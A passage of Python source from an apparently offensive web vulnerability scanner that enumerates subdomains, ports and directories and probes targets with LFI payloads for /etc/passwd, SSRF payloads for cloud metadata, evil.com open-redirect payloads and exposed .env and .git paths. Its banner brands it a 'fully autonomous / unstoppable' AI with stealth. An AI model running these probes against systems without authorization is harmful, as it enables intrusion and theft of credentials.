                p_err(f"Unable to resolve {self.hostname}: {e}")
                sys.exit(1)

        if self.port in (80, 443):
            self.base_url = f"{self.protocol}://{self.hostname}"
        else:
            self.base_url = f"{self.protocol}://{self.hostname}:{self.port}"

    def print_banner(self):
        print(Fore.OKGREEN + BANNER + Fore.RESET)
        print(Fore.GREEN + f"[>] Version : {VERSION}  (QUANTUM | WEB SERVER ONLY)")
        print(Fore.MAGENTA + f"[>] Release : {RELEASE_NAME}")
        print(Fore.CYAN + f"[>] Build   : {BUILD_NUMBER}")
        print(Fore.YELLOW + f"[>] DNS     : {'YES' if DNS_AVAILABLE else 'NO'}")
        print(Fore.YELLOW + f"[>] WHOIS   : {'YES' if WHOIS_AVAILABLE else 'NO'}")
        print(Fore.YELLOW + f"[>] BS4     : {'YES' if BS4_AVAILABLE else 'NO'}")
        print(Fore.YELLOW + f"[>] Twisted : {'YES' if TWISTED_AVAILABLE else 'NO'}")
        print(Fore.ROBOT + "[>] AI ROBOT: FULLY AUTONOMOUS / UNSTOPPABLE")
        print(Fore.SMART + "[>] SMART-AI: ", "ON" if (self.args and getattr(self.args,'smart_ai',False)) else "OFF")
        print(Fore.STEALTH + "[>] STEALTH : ", "ON" if (self.args and getattr(self.args,'stealth',False)) else "OFF")
        print()

    # ============================================
    # MODULE 1: SUBDOMAIN ENUMERATION
    # ============================================
    def subdomain_enumeration(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + f"[+] SUBDOMAIN ENUMERATION → {self.hostname}")
        print(Fore.CYAN + "="*70)
        def check(sub):
            fqdn = f"{sub}.{self.hostname}"
            try:
                ip = socket.gethostbyname(fqdn)
                return (fqdn, ip)
            except socket.gaierror:
                return None
        with ThreadPoolExecutor(max_workers=20) as ex:
            for res in ex.map(check, COMMON_SUBS):
                if res:
                    self.subdomain_results.append(res)
                    p_ok("Subdomain found", f"{res[0]:<40} → {res[1]}")
        if not self.subdomain_results:
            p_warn("No common subdomains resolved")
        return self.subdomain_results

    # ============================================
    # MODULE 2: DNS
    # ============================================
    def dns_enumeration(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + f"[+] DNS ENUMERATION → {self.hostname}")
        print(Fore.CYAN + "="*70)
        self.dns_results = {}
        record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]
        if not DNS_AVAILABLE:
            p_warn("dnspython not installed — socket fallback")
            try:
                ips = socket.getaddrinfo(self.hostname, None, socket.AF_INET)
                self.dns_results['A'] = list({i[4][0] for i in ips})
                for ip in self.dns_results['A']:
                    p_ok("DNS A", ip)
            except Exception as e:
                p_err(f"DNS lookup failed: {e}")
            return self.dns_results
        for rtype in record_types:
            try:
                answers = dns.resolver.resolve(self.hostname, rtype, lifetime=TIMEOUT)
                vals = [str(r) for r in answers]
                self.dns_results[rtype] = vals
                p_ok(f"DNS {rtype}", ", ".join(vals)[:100])
            except Exception:
                p_warn(f"DNS {rtype:<6} → (none)")
        return self.dns_results

    # ============================================
    # MODULE 3: WHOIS
    # ============================================
    def whois_lookup(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + f"[+] WHOIS LOOKUP → {self.hostname}")
        print(Fore.CYAN + "="*70)
        if not WHOIS_AVAILABLE:
            p_warn("python-whois not installed")
            return {}
        try:
            w = whois_lib.whois(self.hostname)
            self.whois_results = {
                "Registrar": str(w.registrar),"Created": str(w.creation_date),
                "Expires": str(w.expiration_date),"Updated": str(w.updated_date),
                "Name Servers": w.name_servers,"Emails": w.emails,
                "Org": w.org,"Country": w.country,
            }
            for k, v in self.whois_results.items():
                if v and str(v) != 'None':
                    print(f"  {Fore.OKCYAN}{k:<15}{Fore.RESET}: {str(v)[:100]}")
        except Exception as e:
            p_err(f"WHOIS failed: {e}")
        return self.whois_results

    # ============================================
    # MODULE 4: SSL
    # ============================================
    def ssl_analysis(self, port=None):
        port = port or (443 if self.port == 80 else self.port)
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + f"[+] SSL CERTIFICATE ANALYSIS → {self.hostname}:{port}")
        print(Fore.CYAN + "="*70)
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((self.hostname, port), timeout=TIMEOUT) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    proto = ssock.version()
            self.ssl_results = {"protocol": proto, "cipher": cipher, "cert": cert}
            print(f"  {Fore.OKCYAN}Protocol    {Fore.RESET}: {proto}")
            print(f"  {Fore.OKCYAN}Cipher      {Fore.RESET}: {cipher[0]} ({cipher[1]} bits)")
            print(f"  {Fore.OKCYAN}Subject     {Fore.RESET}: {dict(x[0] for x in cert.get('subject', []))}")
            print(f"  {Fore.OKCYAN}Issuer      {Fore.RESET}: {dict(x[0] for x in cert.get('issuer', []))}")
            print(f"  {Fore.OKCYAN}Valid From  {Fore.RESET}: {cert.get('notBefore')}")
            print(f"  {Fore.OKCYAN}Valid Until {Fore.RESET}: {cert.get('notAfter')}")
            print(f"  {Fore.OKCYAN}SANs        {Fore.RESET}: {cert.get('subjectAltName', [])}")
        except Exception as e:
            p_err(f"SSL failed: {e}")
        return self.ssl_results

    # ============================================
    # MODULE 5: HEADERS
    # ============================================
    def header_enumeration(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + f"[+] HEADER ENUMERATION → {self.base_url}")
        print(Fore.CYAN + "="*70)
        try:
            r = self._request('GET', self.base_url)
            self.header_results = dict(r.headers)
            for k, v in r.headers.items():
                print(f"  {Fore.OKCYAN}{k:<25}{Fore.RESET}: {v[:100]}")
            sec = ["Strict-Transport-Security","Content-Security-Policy",
                   "X-Frame-Options","X-Content-Type-Options","Referrer-Policy"]
            print(f"\n  {Fore.YELLOW}[*] Security Header Check:{Fore.RESET}")
            for s in sec:
                if s in r.headers: print(f"    {Fore.GREEN}[✓]{Fore.RESET} {s}")
                else:              print(f"    {Fore.RED}[✗]{Fore.RESET} {s} MISSING")
        except Exception as e:
            p_err(f"Header fetch failed: {e}")
        return self.header_results

    # ============================================
    # MODULE 6: ISP
    # ============================================
    def isp_information(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + f"[+] ISP INFORMATION → {self.ip}")
        print(Fore.CYAN + "="*70)
        try:
            r = requests.get(f"http://ip-api.com/json/{self.ip}", timeout=TIMEOUT)
            if r.status_code == 200:
                d = r.json()
                if d.get('status') == 'success':
                    self.isp_results = {
                        'ip':d.get('query'),'isp':d.get('isp'),'org':d.get('org'),
                        'as':d.get('as'),'city':d.get('city'),'region':d.get('regionName'),
                        'country':d.get('country'),
                    }
                    for k, v in self.isp_results.items():
                        print(f"  {Fore.OKCYAN}{k:<10}{Fore.RESET}: {v}")
                    return self.isp_results
        except Exception:
            pass
        try:
            r = requests.get(f"https://ipinfo.io/{self.ip}/json", timeout=TIMEOUT)
            d = r.json()
            for k in ["ip","hostname","city","region","country","org","loc","timezone"]:
                if k in d:
                    self.isp_results[k] = d[k]
                    print(f"  {Fore.OKCYAN}{k:<10}{Fore.RESET}: {d[k]}")
        except Exception as e:
            p_err(f"ISP lookup failed: {e}")
        return self.isp_results

    # ============================================
    # MODULE 7: DIR BRUTEFORCE
    # ============================================
    def directory_bruteforce(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + f"[+] DIRECTORY BRUTEFORCE → {self.base_url}")
        print(Fore.CYAN + "="*70)
        wordlist = COMMON_DIRS
        if self.args and getattr(self.args, 'wordlist', None):
            try:
                with open(self.args.wordlist) as f:
                    wordlist = [l.strip() for l in f if l.strip()]
            except Exception as e:
                p_warn(f"Wordlist load failed: {e}")
        found = 0
        def probe(path):
            target = urljoin(self.base_url + "/", path)
            try:
                r = self._request('GET', target, allow_redirects=False)
                if r.status_code in (200,301,302,401,403):
                    return (target, r.status_code)
            except Exception:
                pass
            return None
        threads = getattr(self.args, 'threads', 15) if self.args else 15
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for res in ex.map(probe, wordlist):
                if res:
                    found += 1
                    self.directory_results.append({"url": res[0], "status": res[1]})
                    color = Fore.GREEN if res[1] == 200 else Fore.YELLOW
                    print(f"  {color}[{res[1]}]{Fore.RESET} {res[0]}")
        if not found:
            p_warn("No common directories found")
        return self.directory_results

    # ============================================
    # MODULE 8: PORT SCAN
    # ============================================
    def port_scan(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + f"[+] PORT SCAN → {self.hostname} ({self.ip})")
        print(Fore.CYAN + "="*70)
        ports = list(COMMON_PORTS.keys())
        if self.args and getattr(self.args, 'ports', None):
            ports = self.args.ports
        def scan(p):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1.5)
                    if s.connect_ex((self.ip, p)) == 0:
                        svc = COMMON_PORTS.get(p, "unknown")
                        banner = ""
                        try:
                            s.settimeout(1); s.send(b"\r\n")
                            banner = s.recv(128).decode(errors="ignore").strip()
                        except Exception:
                            pass
                        return (p, svc, banner)
            except Exception:
                pass
            return None
        threads = getattr(self.args, 'threads', 30) if self.args else 30
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for res in ex.map(scan, ports):
                if res:
                    self.port_scan_results.append({"port":res[0],"service":res[1],"banner":res[2]})
                    print(f"  {Fore.GREEN}[OPEN]{Fore.RESET} {res[0]:<6} {res[1]:<12} {res[2][:50]}")
        if not self.port_scan_results:
            p_warn("No common ports open")
        return self.port_scan_results

    # ============================================
    # MODULE 9: CRAWLER
    # ============================================
    def crawler_spider(self, max_pages=20):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + f"[+] CRAWLER / SPIDER → {self.base_url}")
        print(Fore.CYAN + "="*70)
        if not BS4_AVAILABLE:
            p_warn("BeautifulSoup not installed")
            return []
        visited, queue = set(), deque([self.base_url])
        links, forms, scripts = set(), [], set()
        domain = urlparse(self.base_url).netloc
        count = 0
        while queue and count < max_pages:
            url = queue.popleft()
            if url in visited: continue
            visited.add(url); count += 1
            try:
                r = self._request('GET', url)
                soup = BeautifulSoup(r.text, "html.parser")
                print(f"  {Fore.GREEN}[CRAWL]{Fore.RESET} {url} ({r.status_code})")
                for a in soup.find_all("a", href=True):
                    full = urljoin(url, a["href"])
                    if urlparse(full).netloc == domain and full not in visited:
                        queue.append(full); links.add(full)
                for f in soup.find_all("form"):
                    action = urljoin(url, f.get("action", ""))
                    method = f.get("method", "GET").upper()
                    inputs = [i.get("name") for i in f.find_all("input") if i.get("name")]
                    forms.append({"action":action,"method":method,"inputs":inputs})
                    print(f"      {Fore.YELLOW}FORM{Fore.RESET} {method} {action} inputs={inputs}")
                for s in soup.find_all("script", src=True):
                    scripts.add(urljoin(url, s["src"]))
            except Exception as e:
                p_err(f"{url} → {e}")
        print(f"\n  {Fore.OKCYAN}Pages crawled :{Fore.RESET} {count}")
        print(f"  {Fore.OKCYAN}Unique links  :{Fore.RESET} {len(links)}")
        print(f"  {Fore.OKCYAN}Forms found   :{Fore.RESET} {len(forms)}")
        print(f"  {Fore.OKCYAN}Scripts found :{Fore.RESET} {len(scripts)}")
        self.crawler_results = [{"url":u,"status":"crawled"} for u in visited]
        return self.crawler_results

    # ============================================
    # MODULE 10: VULN
    # ============================================
    def vulnerability_scanning(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + f"[+] VULNERABILITY SCANNING → {self.base_url}")
        print(Fore.CYAN + "="*70)
        findings = []
        for path in [".env",".git/config","robots.txt","sitemap.xml","phpinfo.php",
                     "server-status","backup.zip","backup.sql"]:
            try:
                r = self._request('GET', urljoin(self.base_url + "/", path))
                if r.status_code == 200:
                    findings.append(f"Exposed file: /{path}")
                    print(f"  {Fore.RED}[VULN]{Fore.RESET} Exposed file → /{path}")
            except Exception:
                pass
        try:
            r = self._request('GET', self.base_url)
            if "X-Frame-Options" not in r.headers and \
               "frame-ancestors" not in r.headers.get("Content-Security-Policy", ""):
                findings.append("Clickjacking: missing X-Frame-Options")
                print(f"  {Fore.RED}[VULN]{Fore.RESET} Clickjacking risk")
            if "Server" in r.headers:
                findings.append(f"Server disclosure: {r.headers['Server']}")
                print(f"  {Fore.YELLOW}[INFO]{Fore.RESET} Server: {r.headers['Server']}")
            for c in r.cookies:
                if not c.secure:
                    findings.append(f"Insecure cookie: {c.name}")
                    print(f"  {Fore.RED}[VULN]{Fore.RESET} Cookie '{c.name}' not Secure")
        except Exception:
            pass
        for vuln_type, payloads in VULN_PATTERNS.items():
            for p in payloads[:2]:
                try:
                    test_url = self.base_url + f"/?id={quote(p)}"
                    r = self._request('GET', test_url)
                    if vuln_type == 'XSS' and p in r.text:
                        findings.append(f"Possible XSS: {p}")
                        print(f"  {Fore.RED}[VULN]{Fore.RESET} Possible XSS")
                        break
                    if vuln_type == 'SQL Injection':
                        for err in ["SQL syntax","mysql_fetch","ORA-","PostgreSQL","sqlite"]:
                            if err.lower() in r.text.lower():
                                findings.append(f"Possible SQLi: {err}")
                                print(f"  {Fore.RED}[VULN]{Fore.RESET} Possible SQLi")
                                break
                except Exception:
                    pass
        if not findings:
            p_ok("No obvious vulnerabilities detected")
        self.vuln_scan_results = findings
        return findings

    # ============================================
    # MODULE 11: CONNECTION MAP
    # ============================================
    def connection_map(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + f"[+] CONNECTION MAP → {self.target}")
        print(Fore.CYAN + "="*70)
        print(f"  {Fore.OKCYAN}Hostname     {Fore.RESET}: {self.hostname}")
        print(f"  {Fore.OKCYAN}IP Address   {Fore.RESET}: {self.ip}")
        print(f"  {Fore.OKCYAN}Port         {Fore.RESET}: {self.port}")
        try:
            rev = socket.gethostbyaddr(self.ip)
            print(f"  {Fore.OKCYAN}Reverse DNS  {Fore.RESET}: {rev[0]}")
        except Exception:
            print(f"  {Fore.OKCYAN}Reverse DNS  {Fore.RESET}: (none)")
        try:
            r = self._request('GET', self.target)
            print(f"  {Fore.OKCYAN}Server       {Fore.RESET}: {r.headers.get('Server', 'unknown')}")
            print(f"  {Fore.OKCYAN}Powered-By   {Fore.RESET}: {r.headers.get('X-Powered-By', 'unknown')}")
            print(f"  {Fore.OKCYAN}Status       {Fore.RESET}: {r.status_code}")
            print(f"  {Fore.OKCYAN}Final URL    {Fore.RESET}: {r.url}")
            if r.history:
                print(f"  {Fore.OKCYAN}Redirects    {Fore.RESET}:")
                for h in r.history:
                    print(f"      → {h.status_code} {h.url}")
        except Exception as e:
            p_err(f"HTTP fetch failed: {e}")
        self.isp_information()

    # ============================================
    # MODULE 12: TECH DETECT
    # ============================================
    def tech_detect(self):
        print(Fore.TECH + "\n" + "="*70)
        print(Fore.TECH + "[+] TECHNOLOGY FINGERPRINTING")
        print(Fore.TECH + "="*70)
        try:
            r = self._request('GET', self.base_url)
            haystack = (r.text[:8000] + str(r.headers)).lower()
            for tech, sigs in TECH_SIGNATURES.items():
                for sig in sigs:
                    if sig.lower() in haystack:
                        self.tech_results[tech] = self.tech_results.get(tech, 0) + 1
                        p_tech(f"Detected: {tech}")
                        break
            if not self.tech_results:
                p_warn("No tech signatures matched")
        except Exception as e:
            p_err(f"Tech detect failed: {e}")
        return self.tech_results

    # ============================================
    # MODULE 13: API DISCOVERY
    # ============================================
    def api_discover(self):
        print(Fore.API + "\n" + "="*70)
        print(Fore.API + "[+] API DISCOVERY")
        print(Fore.API + "="*70)
        found = 0
        for path in API_PATHS:
            try:
                url = self.base_url + path
                r = self._request('GET', url, allow_redirects=False)
                if r.status_code in (200,201,202,204,301,302,401,403):
                    self.api_results.append({"url":url,"status":r.status_code,"size":len(r.content)})
                    found += 1
                    p_api(f"[{r.status_code}] {url}")
            except Exception:
                pass
        if not found:
            p_warn("No API endpoints discovered")
        return self.api_results

    # ============================================
    # MODULE 14: SECRET SCAN
    # ============================================
    def secret_scan(self):
        print(Fore.SECRET + "\n" + "="*70)
        print(Fore.SECRET + "[+] DEEP SECRET SCAN")
        print(Fore.SECRET + "="*70)
        try:
            r = self._request('GET', self.base_url)
            text = r.text
            for name, pat in SECRET_PATTERNS.items():
                matches = re.findall(pat, text)
                if matches:
                    self.secret_results.append({
                        "type":name,"count":len(matches),"sample":str(matches[0])[:80],
                    })
                    p_secret(f"{name}: {len(matches)} found")
            if not self.secret_results:
                p_ok("No secrets found")
        except Exception as e:
            p_err(f"Secret scan failed: {e}")
        return self.secret_results

    # ============================================
    # MODULE 15: CORS SCAN
    # ============================================
    def cors_scan(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] CORS MISCONFIGURATION SCAN")
        print(Fore.CYAN + "="*70)
        for origin in CORS_TEST_ORIGINS:
            try:
                r = self._request('GET', self.base_url,
                                  headers={'Origin': origin}, allow_redirects=False)
                acao = r.headers.get('Access-Control-Allow-Origin', '')
                acac = r.headers.get('Access-Control-Allow-Credentials', '')
                if acao == origin or acao == '*':
                    self.cors_results.append({"origin":origin,"acao":acao,"acac":acac})
                    sev = "HIGH" if acac.lower() == 'true' else "MEDIUM"
                    print(f"  {Fore.RED}[{sev}]{Fore.RESET} {origin} → ACAO:{acao} ACAC:{acac}")
            except Exception:
                pass
        if not self.cors_results:
            p_ok("No CORS misconfig detected")
        return self.cors_results

    # ============================================
    # MODULE 16: HTTP METHODS
    # ============================================
    def http_methods_enum(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] HTTP METHOD ENUMERATION")
        print(Fore.CYAN + "="*70)
        allowed = []
        for method in HTTP_METHODS:
            try:
                r = self._request(method, self.base_url, allow_redirects=False)
                if r.status_code not in (405, 501, 400):
                    allowed.append(method)
                    print(f"  {Fore.GREEN}[{r.status_code}]{Fore.RESET} {method}")
            except Exception:
                pass
        self.http_methods_results = {"allowed": allowed}
        return self.http_methods_results

    # ============================================
    # MODULE 17: BACKUP HUNT
    # ============================================
    def backup_hunt(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] BACKUP FILE HUNTING")
        print(Fore.CYAN + "="*70)
        bases = ['index','config','backup','db','database','app','www','web','site',
                 '.env','wp-config','composer','package']
        found = 0
        for base in bases:
            for ext in BACKUP_EXTS:
                url = urljoin(self.base_url + "/", base + ext)
                try:
                    r = self._request('GET', url, allow_redirects=False)
                    if r.status_code in (200,301,302):
                        self.backup_results.append({"url":url,"status":r.status_code})
                        found += 1
                        print(f"  {Fore.RED}[{r.status_code}]{Fore.RESET} {url}")
                except Exception:
                    pass
        if not found:
            p_warn("No backup files found")
        return self.backup_results

    # ============================================
    # MODULE 18: GIT HUNT
    # ============================================
    def git_hunt(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] GIT / SVN / HG EXPOSURE HUNT")
        print(Fore.CYAN + "="*70)
        paths = ['/.git/config','/.git/HEAD','/.svn/entries','/.hg/hgrc',
                 '/.gitignore','/.gitattributes']
        found = 0
        for path in paths:
            try:
                r = self._request('GET', self.base_url + path, allow_redirects=False)
                if r.status_code in (200,301,302):
                    self.git_results.append({"url":self.base_url + path,"status":r.status_code})
                    found += 1
                    print(f"  {Fore.RED}[{r.status_code}]{Fore.RESET} {self.base_url + path}")
            except Exception:
                pass
        if not found:
            p_warn("No .git/.svn/.hg exposure")
        return self.git_results

    # ============================================
    # MODULE 19: ENV HUNT
    # ============================================
    def env_hunt(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] ENV / CONFIG EXPOSURE HUNT")
        print(Fore.CYAN + "="*70)
        paths = ['/.env','/.env.local','/.env.production','/.env.backup','/config.json',
                 '/config.yaml','/config.yml','/settings.py','/web.config',
                 '/appsettings.json','/wp-config.php~']
        found = 0
        for path in paths:
            try:
                r = self._request('GET', self.base_url + path, allow_redirects=False)
                if r.status_code in (200,301,302):
                    self.env_results.append({"url":self.base_url + path,"status":r.status_code})
                    found += 1
                    print(f"  {Fore.RED}[{r.status_code}]{Fore.RESET} {self.base_url + path}")
            except Exception:
                pass
        if not found:
            p_warn("No env/config exposure")
        return self.env_results

    # ============================================
    # MODULE 20: OPEN REDIRECT
    # ============================================
    def open_redirect_scan(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] OPEN REDIRECT SCAN")
        print(Fore.CYAN + "="*70)
        params = ['url','redirect','next','return','returnUrl','continue','dest']
        payloads = ['https://evil.com','//evil.com','/\\evil.com']
        found = 0
        for p in params:
            for pl in payloads:
                try:
                    test = f"{self.base_url}?{p}={quote(pl)}"
                    r = self._request('GET', test, allow_redirects=False)
                    loc = r.headers.get('Location', '')
                    if 'evil.com' in loc:
                        self.open_redirect_results.append({"param":p,"payload":pl,"location":loc})
                        found += 1
                        print(f"  {Fore.RED}[VULN]{Fore.RESET} {p}={pl} → {loc}")
                        break
                except Exception:
                    pass
        if not found:
            p_ok("No open redirect detected")
        return self.open_redirect_results

    # ============================================
    # MODULE 21: LFI
    # ============================================
    def lfi_scan(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] LFI SCAN")
        print(Fore.CYAN + "="*70)
        payloads = ['../../../../etc/passwd','....//....//....//etc/passwd',
                    '..%2f..%2f..%2f..%2fetc/passwd','/etc/passwd%00']
        params = ['file','page','path','include','view']
        found = 0
        for p in params:
            for pl in payloads:
                try:
                    test = f"{self.base_url}?{p}={quote(pl)}"
                    r = self._request('GET', test, allow_redirects=False)
                    if 'root:x:' in r.text or 'root:!:' in r.text:
                        self.lfi_results.append({"param":p,"payload":pl})
                        found += 1
                        print(f"  {Fore.RED}[VULN]{Fore.RESET} LFI via {p}")
                        break
                except Exception:
                    pass
        if not found:
            p_ok("No LFI detected")
        return self.lfi_results

    # ============================================
    # MODULE 22: SSRF
    # ============================================
    def ssrf_scan(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] SSRF SCAN")
        print(Fore.CYAN + "="*70)
        payloads = ['http://127.0.0.1','http://localhost',
                    'http://169.254.169.254/latest/meta-data/']
        params = ['url','uri','link','src','target','fetch']
        found = 0
        for p in params:
            for pl in payloads:
                try:
                    test = f"{self.base_url}?{p}={quote(pl)}"
                    r = self._request('GET', test, allow_redirects=False)
                    if r.status_code in (200,201,202,301,302) and \
                       ('localhost' in r.text.lower() or 'meta-data' in r.text.lower()):
                        self.ssrf_results.append({"param":p,"payload":pl})
                        found += 1
                        print(f"  {Fore.RED}[VULN]{Fore.RESET} Possible SSRF via {p}")
                        break
                except Exception:
                    pass
        if not found:
            p_ok("No obvious SSRF")
        return self.ssrf_results

    # ============================================
    # MODULE 23: CLOUD METADATA
    # ============================================
    def cloud_metadata_scan(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] CLOUD METADATA ENDPOINT PROBE")
        print(Fore.CYAN + "="*70)
        found = 0
        for meta_url in CLOUD_METADATA_URLS:
            try:
                r = self._request('GET', meta_url, timeout=3, allow_redirects=False)
                if r.status_code == 200 and len(r.text) > 0:
                    self.cloud_results.append({"url":meta_url,"size":len(r.content)})
                    found += 1
                    print(f"  {Fore.RED}[OPEN]{Fore.RESET} {meta_url} ({len(r.content)} bytes)")
            except Exception:
                pass
        if not found:
            p_warn("No cloud metadata endpoints reachable")
        return self.cloud_results

    # ============================================
    # MODULE 24: GRAPHQL
    # ============================================
    def graphql_scan(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] GRAPHQL SCAN")
        print(Fore.CYAN + "="*70)
        endpoints = ['/graphql','/graphiql','/api/graphql','/v1/graphql']
        query = '{"query":"{__schema{types{name}}}"}'
        for ep in endpoints:
            try:
                url = self.base_url + ep
                r = self._request('POST', url, data=query,
                                  headers={'Content-Type': 'application/json'},
                                  allow_redirects=False)
                if r.status_code in (200,201) and '__schema' in r.text:
                    self.graphql_results = {"endpoint":url,"introspection":True}
                    print(f"  {Fore.RED}[VULN]{Fore.RESET} GraphQL introspection: {url}")
                    return self.graphql_results
            except Exception:
                pass
        p_ok("No GraphQL introspection enabled")
        return self.graphql_results

    # ============================================
    # MODULE 25: JWT ANALYZE
    # ============================================
    def jwt_analyze(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] JWT ANALYSIS")
        print(Fore.CYAN + "="*70)
        try:
            r = self._request('GET', self.base_url)
            jwt_pat = re.compile(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+')
            tokens = jwt_pat.findall(r.text + str(r.headers))
            for t in tokens[:5]:
                parts = t.split('.')
                try:
                    header = json.loads(base64.urlsafe_b64decode(parts[0] + '==').decode(errors='ignore'))
                    alg = header.get('alg', 'unknown')
                    self.jwt_results.setdefault('tokens', []).append({'alg':alg,'token':t[:40]})
                    if alg.lower() == 'none':
                        print(f"  {Fore.RED}[VULN]{Fore.RESET} JWT alg:none!")
                    else:
                        print(f"  {Fore.YELLOW}[JWT]{Fore.RESET} alg={alg}")
                except Exception:
                    pass
            if not tokens:
                p_ok("No JWT tokens in response")
        except Exception as e:
            p_err(f"JWT analyze failed: {e}")
        return self.jwt_results

    # ============================================
    # MODULE 26: TLS DEEP
    # ============================================
    def tls_deep_scan(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] DEEP TLS SCAN")
        print(Fore.CYAN + "="*70)
        protocols = []
        for name, proto in [('TLSv1', ssl.TLSVersion.TLSv1),
                            ('TLSv1.1', ssl.TLSVersion.TLSv1_1),
                            ('TLSv1.2', ssl.TLSVersion.TLSv1_2),
                            ('TLSv1.3', ssl.TLSVersion.TLSv1_3)]:
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                try:
                    ctx.minimum_version = proto
                    ctx.maximum_version = proto
                except Exception:
                    continue
                with socket.create_connection((self.hostname, 443), timeout=3) as sock:
                    with ctx.wrap_socket(sock, server_hostname=self.hostname) as s:
                        protocols.append(name)
                        print(f"  {Fore.GREEN}[SUPPORTED]{Fore.RESET} {name}")
            except Exception:
                print(f"  {Fore.RED}[NOT-SUPPORTED]{Fore.RESET} {name}")
        self.tls_results = {"protocols": protocols}
        return self.tls_results

    # ============================================
    # MODULE 27: CERT TRANSPARENCY
    # ============================================
    def cert_transparency_lookup(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] CERTIFICATE TRANSPARENCY LOOKUP")
        print(Fore.CYAN + "="*70)
        try:
            url = f"https://crt.sh/?q=%25.{self.hostname}&output=json"
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                seen = set()
                for entry in data[:50]:
                    for n in entry.get('name_value', '').split('\n'):
                        n = n.strip()
                        if n and n not in seen:
                            seen.add(n); self.ct_logs.append(n)
                            print(f"  {Fore.OKCYAN}[CT]{Fore.RESET} {n}")
            p_ok(f"Total CT entries: {len(self.ct_logs)}")
        except Exception as e:
            p_err(f"CT lookup failed: {e}")
        return self.ct_logs

    # ============================================
    # MODULE 28: SUBDOMAIN TAKEOVER
    # ============================================
    def subdomain_takeover_check(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] SUBDOMAIN TAKEOVER CHECK")
        print(Fore.CYAN + "="*70)
        fingerprints = {
            'GitHub Pages': "There isn't a GitHub Pages site here",
            'AWS S3': 'NoSuchBucket','Heroku': 'No such app',
            'Shopify': 'Sorry, this shop is currently unavailable',
            'Azure': '404 Web Site not found','Fastly': 'Fastly error: unknown domain',
        }
        for sub, ip in self.subdomain_results[:20]:
            try:
                r = self._request('GET', f"http://{sub}", timeout=3)
                for name, fp in fingerprints.items():
                    if fp.lower() in r.text.lower():
                        self.subdomain_takeover.append({"subdomain":sub,"provider":name})
                        print(f"  {Fore.RED}[VULN]{Fore.RESET} {sub} → {name} takeover")
                        break
            except Exception:
                pass
        if not self.subdomain_takeover:
            p_ok("No subdomain takeover detected")
        return self.subdomain_takeover

    # ============================================
    # MODULE 29: JS ANALYZE
    # ============================================
    def js_analyze(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] JAVASCRIPT ANALYSIS")
        print(Fore.CYAN + "="*70)
        if not BS4_AVAILABLE:
            p_warn("BS4 required")
            return []
        try:
            r = self._request('GET', self.base_url)
            soup = BeautifulSoup(r.text, "html.parser")
            scripts = [urljoin(self.base_url, s['src']) for s in soup.find_all('script', src=True)]
            print(f"  {Fore.OKCYAN}Found {len(scripts)} JS files{Fore.RESET}")
            endpoints = set()
            for js_url in scripts[:10]:
                try:
                    jr = self._request('GET', js_url)
                    eps = re.findall(r'["\'](/api/[^"\']+)["\']', jr.text)
                    endpoints.update(eps)
                except Exception:
                    pass
            for ep in list(endpoints)[:20]:
                print(f"  {Fore.YELLOW}[ENDPOINT]{Fore.RESET} {ep}")
            return list(endpoints)
        except Exception as e:
            p_err(f"JS analyze failed: {e}")
            return []

    # ============================================
    # v10000 NEW MODULE 30: CVE EXPLOIT TESTS
    # ============================================
    def cve_exploit_tests(self):
        print(Fore.CVE + "\n" + "="*70)
        print(Fore.CVE + "[!!!] CVE EXPLOIT TESTS")
        print(Fore.CVE + "="*70)
        for cve_name, test in CVE_TESTS.items():
            try:
                r = self._request('GET', self.base_url, headers=test.get('headers', {}))
                # Heuristic detection (echo-back or error)
                if test.get('payload') and test['payload'] in r.text:
                    self.cve_results.append({"cve":cve_name,"status":"POSSIBLE","evidence":"payload echoed"})
                    print(f"  {Fore.RED}[POSSIBLE]{Fore.RESET} {cve_name}")
                else:
                    print(f"  {Fore.GREEN}[SAFE?]{Fore.RESET} {cve_name}")
